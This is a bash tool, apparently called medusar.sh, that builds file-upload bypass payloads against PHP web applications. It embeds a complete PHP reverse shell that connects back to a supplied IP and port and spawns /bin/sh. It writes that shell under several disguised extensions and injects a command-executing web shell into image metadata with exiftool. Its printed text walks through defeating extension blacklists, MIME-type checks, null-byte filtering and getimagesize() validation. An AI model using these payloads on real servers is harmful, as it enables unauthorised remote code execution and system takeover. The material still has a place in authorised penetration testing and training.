#!/bin/bash

function _header_(){

cat << EOF

┌┬┐  ┌─┐  ┌┬┐  ┬ ┬  ┌─┐  ┌─┐  ┬─┐
│││  ├┤    ││  │ │  └─┐  ├─┤  ├┬┘
┴ ┴  └─┘  ─┴┘  └─┘  └─┘  ┴ ┴  ┴└─

EOF
}

function _help_(){
	printf "%s\n\n" "RCE File Upload Bypass"
	printf "%s\n" "Options:"
        printf "%s\n" "--extension-no-control                 [ NO BYPASS ]"
        printf "%s\n" "--extension-blacklist                  [ BYPASS EXTENSION BLACKLIST ]"
        printf "%s\n" "--extension-control                    [ BYPASS EXTENSION CONTROL ]"
        printf "%s\n" "--extension-control-and-mime-type      [ BYPASS EXTENSION CONTROL & MIME TYPE ]"
        printf "%s\n" "--getimagesize                         [ BYPASS getimagesize() FUNCTION CONTROL ]"
        printf "%s\n" "--imagemagick                          (not available yet)"
	printf "%s\n\n" "--all                                  [ CREATE ALL BYPASS PAYLOADS ]"

	printf "%s\n" "Examples:"
	printf "%s\n" "bash $0 --extension-blacklist <ip> <port>"
	printf "%s\n" "bash $0 --getimagesize <picture>"
	printf "%s\n" "bash $0 --all <ip> <port> <picture>"

	exit
}

function _php_payload_(){

cat <<EOF

<?php

set_time_limit (0);
\$VERSION = "1.0";
\$ip = "$1";
\$port = $2;
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/sh -i';
\$daemon = 0;
\$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        \$pid = pcntl_fork();

        if (\$pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if (\$pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        \$daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
if (!\$sock) {
        printit("\$errstr (\$errno)");
        exit(1);
}

// Spawn shell process
\$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);

if (!is_resource(\$process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit("Successfully opened reverse shell to \$ip:\$port");

while (1) {
        // Check for end of TCP connection
        if (feof(\$sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof(\$pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down \$sock, or some
        // command output is available on STDOUT or STDERR
        \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
        \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array(\$sock, \$read_a)) {
                if (\$debug) printit("SOCK READ");
                \$input = fread(\$sock, \$chunk_size);
                if (\$debug) printit("SOCK: \$input");
                fwrite(\$pipes[0], \$input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array(\$pipes[1], \$read_a)) {
                if (\$debug) printit("STDOUT READ");
                \$input = fread(\$pipes[1], \$chunk_size);
                if (\$debug) printit("STDOUT: \$input");
                fwrite(\$sock, \$input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array(\$pipes[2], \$read_a)) {
                if (\$debug) printit("STDERR READ");
                \$input = fread(\$pipes[2], \$chunk_size);
                if (\$debug) printit("STDERR: \$input");
                fwrite(\$sock, \$input);
        }
}

fclose(\$sock);
fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
proc_close(\$process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit (\$string) {
        if (!\$daemon) {
                print "\$string\n";
        }
}

?> 



EOF

}




filename="shell"

_header_

if [[ "$1" == "--extension-no-control" ]] && [[ "$2" ]] && [[ "$3" ]]
then
	printf "%s\n" "The php simply picks up the form file and will save it to the uploads folder, without any restrictions."
        printf "%s\n\n" "This allows us to upload any type of file, such as a php that allows us to execute commands."

	printf "[\e[0;32m+\e[0m] Generating .php payload\n"
	_php_payload_ "$2" "$3" > /tmp/$filename.php
	printf "%s\n" "File is in /tmp/$filename.php"

elif [[ "$1" == "--extension-blacklist" ]] && [[ "$2" ]] && [[ "$3" ]]
then

	printf "%s\n" "The extensions blacklist will be a list of file types that are not supported by the server."
        printf "%s\n" "The problem with this method is the large number of files that would be a risk to admit in the form, so it is recommended"
        printf "%s\n" "make the list backwards, that is, of those that are allowed."
        printf "%s\n" "For example, the code validates that the file is neither .php, nor plain text nor .exe"
        printf "%s\n" "In this example this does not assure us that php cannot be executed, since only by changing the .php to .phar it is also possible to execute php code."
        printf "%s\n" "Some extensions that run php are:"
	printf "%s\n\n" ".phar"

	printf "[\e[0;32m+\e[0m] Generating .phar payload\n"
	_php_payload_ "$2" "$3" > /tmp/$filename.phar
	printf "%s\n" "File is in /tmp/$filename.phar"

elif [[ "$1" == "--extension-control" ]] && [[ "$2" ]] && [[ "$3" ]]
then

	printf "%s\n" "In this case the php script will do a simple check if the extension is in the name string."
        printf "%s\n\n" "It is a very low security protection since simply changing our webshell.php to webshell.jpeg.php would allow us to upload it."

	printf "%s\n\n" "What extension is permited? (rename .jpeg.php to .png.php or .<filepermitedtoupload>.php)"
	printf "[\e[0;32m+\e[0m] Generating .jpeg.php payload\n"
	_php_payload_ "$2" "$3" > /tmp/$filename.jpeg.php
	printf "%s\n" "File is in /tmp/$filename.jpeg.php"

elif [[ "$1" == "--extension-control-and-mime-type" ]] && [[ "$2" ]] && [[ "$3" ]]
then
	printf "[\e[0;33m+\e[0m] \e[1mBURPSUITE\e[0m NEED, options: Modifying the extension or Null byte method\n\n"
	printf "%s\n\n" "(TL;DR)"
	printf "%s\n\n" "The php that controls the file upload in this case will check the type of file uploaded by using the FILES associative array."
        printf "%s\n" "This script checks that only png or jpeg are uploaded."
        printf "%s\n" "The problem with this method that it only checks the extension at the time of sending it, that is, on the client side. It also checks the content type."
        printf "%s\n\n" "We find several methods:"
        printf "\e[0;33mA\e[0m) Modifying the extension   [ easy ]\n"
        printf "%s\n" "We can intercept the POST request with the burpsuite and modify the extension with which it is going to save the file but we keep the MIME"
        printf "%s\n\n" "as if it were an image."
        printf "%s\n" "We will use the webshell.php whose code is in the upper section to exploit it and we simply change the name"
        printf "%s\n\n" "from webshell.php to webshell.php.jpeg in order to detect that the content type is jpeg."
        printf "\e[0;33mB\e[0m) Null byte   [ medium ]\n"
        printf "%s\n" "We can upload an image by changing the name of webshell.php to webshell.php.jpeg and introducing the Null byte behind php."
        printf "%s\n\n" "To do this, we intercept the upload of our file with BurpSuite and add a letter behind php, something like this:"
        printf "%s\n\n" "webshell.phpX.jpeg"
        printf "%s\n" "Looking in the hexadecimal of the POST intercepted by BurpSuite, we find the hexadecimal of the file name and modify"
        printf "%s\n" "the hexadecimal corresponding to our X by 00."
        printf "%s\n\n" "In this way it detects the NullByte and does not take into account the second extension when saving it so it would be like webshell.php"

	printf "[\e[0;32m+\e[0m] Generating .php.jpeg payload\n"
	_php_payload_ "$2" "$3" > /tmp/$filename.php.jpeg
	printf "%s\n\n" "File is in /tmp/$filename.php.jpeg"
	printf "[\e[0;33m+\e[0m] Time to open \e[1mBurpsuite\e[0m\n"
	printf "%s\n" "Go to proxy, intercept, open browser and modify $filename.php.jpg to $filename.php"


elif [[ "$1" == "--getimagesize" ]]
then

	if ! command -v exiftool &> /dev/null
	then
		printf "exiftool is not installed\nRun apt-get install exiftool -y\n"
		exit
        fi


	if [[ -z "$2" ]]
	then
		printf "%s\n" "--getimagesize needs second parameter as image file"
		printf "%s\n" "example:"
		printf "%s\n" "bash medusar.sh --getimagesize /pictures/rose.jpeg"
		exit
	else

		printf "%s\n" "The getimagesize() function obtains a series of information from the image, when the file that is passed to it is not an image, an error is obtained."
	        printf "%s\n\n" "Thanks to this, some programmers take advantage of it to validate the upload of images. This is exploitable."
        	printf "%s\n\n" "We can achieve RCE by adding a php script to the metadata of the image, as before we will use the webshell.php"
		printf "%s\n" "We just have to add a comment to the metadata with the php script to be executed, as we can see, the script does not close"
	        printf "%s\n" "and at the end __halt_compiler () is added; so that it does not execute the data of the image itself and the php compilation error."
        	printf "%s\n\n" "We just have to rename our image from $2.jpg to $2.jpg.php and we could upload it without problem."

		# avoid exiftool file already exists error #
		rm -r /tmp/$filename.php.phtml 2>/dev/null
		#                                          #
		printf "[\e[0;32m+\e[0m] Generating .php.phtml payload\n"
		exiftool -Comment="<?php echo '<form action=\''.\$PHP_SELF.'\' method=\'post\'>Command:<input type=\'text\' name=\'cmd\'><input type=\'submit\'></form>'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();?>" "$2" -o /tmp/shell.php.phtml
		printf "%s\n" "File is in /tmp/$filename.php.phtml"
	fi

elif [[ "$1" == "--imagemagick" ]]
then
	printf "%s\n" "This option is not available yet, sorry"


elif [[ "$1" == "--all" ]] && [[ "$2" ]] && [[ "$3" ]]
then

	# [ NO BYPASS ]
        printf "[\e[0;32m+\e[0m] Generating .php payload\n\n"
        _php_payload_ "$2" "$3" > /tmp/$filename.php

	# [ BYPASS EXTENSION-BLACKLIST ]
	printf "[\e[0;32m+\e[0m] Generating .phar payload\n\n"
        _php_payload_ "$2" "$3" > /tmp/$filename.phar

	# [ BYPASS EXTENSION-CONTROL ]
        printf "[\e[0;32m+\e[0m] Generating .jpeg.php payload\n\n"
        _php_payload_ "$2" "$3" > /tmp/$filename.jpeg.php

	# [ BYPASS EXTENSION-CONTROL-AND-MIME-TYPE ]
	printf "[\e[0;32m+\e[0m] Generating .php.jpeg payload\n"
        _php_payload_ "$2" "$3" > /tmp/$filename.php.jpeg
        printf "[\e[0;33m+\e[0m] Time to open \e[1mBurpsuite\e[0m\n"
        printf "%s\n\n" "Go to proxy, intercept, open browser and modify $filename.php.jpg to $filename.php"

	# [ BYPASS getimagesize() FUNCTION ]
	if ! command -v exiftool &> /dev/null
        then
                printf "exiftool is not installed\nRun apt-get install exiftool -y\n"
                exit
        fi


        if [[ -z "$4" ]]
        then
                printf "%s\n" "getimagesize() function method needs second parameter as image file"
		printf "%s\n" "Example:"
		printf "%s\n" "bash medusar.sh --all <ip> <port> /pictures/rose.jpeg"
                exit
        else

                # avoid exiftool file already exists error #
                rm -r /tmp/$filename.php.phtml 2>/dev/null
                #                                          #
                printf "[\e[0;32m+\e[0m] Generating .php.phtml payload\n\n"
                exiftool -Comment="<?php echo '<form action=\''.\$PHP_SELF.'\' method=\'post\'>Command:<input type=\'text\' name=\'cmd\'><input type=\'submit\'></form>'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();?>" "$4" -o /tmp/shell.php.phtml
        fi


else

	_help_
	exit

fi
